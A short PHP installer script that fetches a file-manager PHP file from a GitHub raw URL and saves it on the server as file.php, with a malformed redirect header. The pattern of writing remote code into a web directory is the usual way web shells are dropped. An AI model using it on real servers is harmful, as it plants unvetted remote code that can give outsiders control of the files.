<?php
ob_start();
	if (file_put_contents('file.php', file_get_contents('https://raw.githubusercontent.com/TheRatanDas/script/main/filemanager/file-manager.php')))
	{
		echo "File Manager successfully installed";
      	header("Location:", true, 301);
		exit();
	}
	else
	{
		echo "File Manager installing failed.";
	}
ob_end_flush();
?>
